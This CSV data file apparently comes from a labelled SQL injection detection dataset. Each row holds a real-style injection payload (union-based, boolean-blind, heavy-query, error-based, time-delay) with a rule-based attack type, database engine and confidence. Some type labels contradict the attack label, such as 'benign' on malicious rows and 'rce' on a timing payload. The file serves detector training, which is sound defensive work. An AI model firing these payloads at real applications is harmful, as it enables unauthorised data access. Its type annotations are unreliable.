row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
3640,"1'|| ( select 'odud' from dual where 2468 = 2468 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,,heavy_query,oracle,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on oracle",rule-based
3641,end and ( ( '%' = ',1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3642,"1'+ ( select kpso where 1226 = 1226 union all select null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3643,"1"" ) as lvbm where 8179 = 8179",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3644,-7231 ) ) union all select 7639#,1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3645,"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) -- rlas",1,,rce,generic,0.95,0x694a4745 detected — rce injection (priority 1) on generic,rule-based
3646,1'+ ( select 'gtqr' where 5660 = 5660,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3647,"1%"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
3648,"1"" where 9618 = 9618 and ( 3020 = 3020 ) *6703--",1,,boolean_blind,generic,0.95,9618 = 9618 and detected — boolean_blind injection (priority 8) on generic,rule-based
3649,"1' ) ) as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3650,"1"" ) ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ( ""ruvo"" like ""ruvo",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
3651,-2402 or 3440 = cast ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) ) || ( select ( case when ( 3440 = 3440 ) then 1 else 0 end ) ) ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) as numeric ) -- szgq,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3652,"-1676'|| ( select 'xzmu' from dual where 6373 = 6373 union all select 6373,6373--",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
3653,"1%' and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and '%' = '",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
3654,"-7611 ) as tuje where 6101 = 6101 union all select 6101,6101,6101,6101,6101,6101,6101,6101--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3655,"1"" ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) and ( ""bmbg"" like ""bmbg",1,,boolean_blind,generic,0.95,") and (, like "" detected — boolean_blind injection (priority 8) on generic",rule-based
3656,"-5625"" union all select 6087,6087,6087,6087,6087,6087--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3657,1' ) ) as yyud where 4934 = 4934,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
3658,"-7744"" ) ) ) union all select 9408,9408,9408,9408--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
3659,"1' ) ) ) and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) and ( ( ( 'msjw' like 'msjw",1,,heavy_query,firebird,0.95,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb detected — heavy_query injection (priority 6) on firebird",rule-based
